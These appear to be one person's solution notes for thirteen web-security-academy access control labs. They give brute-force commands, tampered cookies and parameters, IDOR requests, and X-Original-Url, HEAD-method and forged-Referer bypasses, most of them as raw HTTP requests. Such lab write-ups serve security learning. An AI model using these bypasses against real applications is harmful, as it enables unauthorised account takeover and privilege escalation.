# Access Control Labs – Quick Navigation
- [Unprotected admin functionality](#unprotected-admin-functionality)
- [Unprotected admin functionality with unpredictable URL](#unprotected-admin-functionality-with-unpredictable-url)
- [User role controlled by request parameter](#user-role-controlled-by-request-parameter)
- [User role can be modified in user profile](#user-role-can-be-modified-in-user-profile)
- [User ID controlled by request parameter](#user-id-controlled-by-request-parameter)
- [User ID controlled by request parameter, with unpredictable user IDs](#user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
- [User ID controlled by request parameter with data leakage in redirect](#user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
- [User ID controlled by request parameter with password disclosure](#user-id-controlled-by-request-parameter-with-password-disclosure)
- [Insecure direct object references](#insecure-direct-object-references)
- [URL-based access control can be circumvented](#url-based-access-control-can-be-circumvented)
- [Method-based access control can be circumvented](#method-based-access-control-can-be-circumvented)
- [Multi-step process with no access control on one step](#multi-step-process-with-no-access-control-on-one-step)
- [Referer-based access control](#referer-based-access-control)
# Unprotected admin functionality
1. Use `feroxbuster` to discover `/administrator-panel`
```sh
feroxbuster -u https://...<SNIP>....web-security-academy.net/ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --silent -n
```
2. Directly browse to `/administrator-panel` > Delete Carlos
# Unprotected admin functionality with unpredictable URL
1. Navigate to web root
2. View HTML source code and identify admin panel at `/admin-<RANDOM_STRING>`
3. Force browser to admin panel > Delete Carlos
# User role controlled by request parameter
1. Login with credentials `wiener:peter`
2. Browser storage shows two cookies:
	1. `Admin: false`
	2. `session: <RANDOM_STRING>`
3. Change `Admin` cookie to `TRUE`
4. Access `/admin` > Delete Carlos
# User role can be modified in user profile
1. Login with credentials `wiener:peter`
2. Change email address
3. Send POST request to repeater and see `roleid` is a value returned in HTTP response
4. Include `roleid` in your POST request to update email changing the value to `2`
5. Access `/admin` > Delete Carlos
# User ID controlled by request parameter
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter in the URL
```
/my-account?id=wiener
```
3. Change `id` parameter to `administrator`
```
/my-account?id=administrator
```
3. Obtain Administrator's API key
# User ID controlled by request parameter, with unpredictable user IDs
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter using a `uuid`
```
/my-account?id=b8d3e905-d7f0-4de2-8919-8852dd334e7f
```
3. Navigate blog posts and see the author's names have links
4. Inspecting HTML source discloses the `uuid` value of authors
5. Copy Carlos `uuid` and make request to view their account
```
/my-account?id=f1034152-2abd-40e5-aab2-da98672598f3
```
# User ID controlled by request parameter with data leakage in redirect
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter
```
/my-account?id=wiener
```
- Account page discloses user's API key
3. Send request to repeater and change `wiener` to `carlos`
```
/my-account?id=carlos
```
4. We receive a `302 Found` but the HTTP response discloses `carlos` API key
# User ID controlled by request parameter with password disclosure
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter
```
/my-account?id=wiener
```
- Account page has a password change feature which is automatically populated with the user's password
	- Audit the HTTP response and see the user's password included in the HTTP response
3. Send a request to repeater and change `wiener` to `administrator`
4. Retrieve administrators password > Login as admin > Delete Carlos
# Insecure direct object references
1. Open application
2. Open "Live chat" feature
3. Select "View transcript" and see `.txt` file is downloaded
	1. This file is called `2.txt` 
4. Capture `GET` request showing transcript contents and send to repeater
5. Change `2.txt` to `1.txt` and retrieve another user's chat transcript
6. Retrieve password and sign in
# URL-based access control can be circumvented
1. Capture request to web root `/` in burp and send to repeater
2. Test if `X-Original-Url` header is supported by directing to a resource that does not exist
```
GET / HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /does_not_exist
```
- `404 not found` returned indicates this header is supported
3. Using the same request, change the URL to the restricted resource `/admin`
```
GET / HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /admin
```
4. We get `200 OK` and can see the HTTP response of the `/admin` page
5. There are two links to delete users `/admin/delete?username=carlos`
6. Construct a request to delete the user `carlos`
```
GET ?username=carlos HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /admin/delete
```
- Same can be done using a POST request
```
POST HTTP/2 HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /admin/delete

...<SNIP>...
username=carlos
```
# Method-based access control can be circumvented
1. Login to admin panel `administrator:admin` 
2. Capture requests to upgrade/downgrade `wiener`
3. Logout and login with `wiener:peter` to get their session token
4. Replaying request to upgrade `wiener` returns `401`
```
POST /admin-roles HTTP/2
Host: 0a0800b50405c5e180e377c9004e0017.web-security-academy.net
Cookie: session=MdZyuo0BvLeGDc9b3mRDOjwcu3eauTYS

username=wiener&action=downgrade
```
5. Change request method to `HEAD` and place the parameters in the URL
```
HEAD /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a0800b50405c5e180e377c9004e0017.web-security-academy.net
Cookie: session=MdZyuo0BvLeGDc9b3mRDOjwcu3eauTYS
```
6. Account is now upgraded
# Multi-step process with no access control on one step
1. Login to admin panel `administrator:admin`
2. Upgrading user sends two POST requests the second one "Confirming" the action which just adds an additional parameter in the POST body
```
action=upgrade&confirmed=true&username=wiener
```
3. Send this request to repeater
4. Login as `wiener` and get their session token
5. Send request with `wiener`'s session to the same "Confirm" endpoint to upgrade their user account
```
POST /admin-roles HTTP/2
Host: 0ac3008503d4845080f88ffb00390069.web-security-academy.net
Cookie: session=rH9ASUnMc7Sr2gdLoMweuuFOSyitsC7A

action=upgrade&confirmed=true&username=wiener
```
# Referer-based access control
1. Login to admin panel `administrator:admin` 
2. Capture requests to upgrade/downgrade `wiener`
3. Logout and login with `wiener:peter` to get their session token
4. Replaying request to upgrade `wiener` returns `401`
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a65000a041badf2827a974a006000b6.web-security-academy.net
Cookie: session=GkklYgrP3Yd1DCXTbPMdm43VMfXWZxPh
```
5. Provide a fake `Referer:` header as though the request appears from a privileged location
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a65000a041badf2827a974a006000b6.web-security-academy.net
Cookie: session=GkklYgrP3Yd1DCXTbPMdm43VMfXWZxPh
...<SNIP>...
Referer: https://0a65000a041badf2827a974a006000b6.web-security-academy.net/admin
```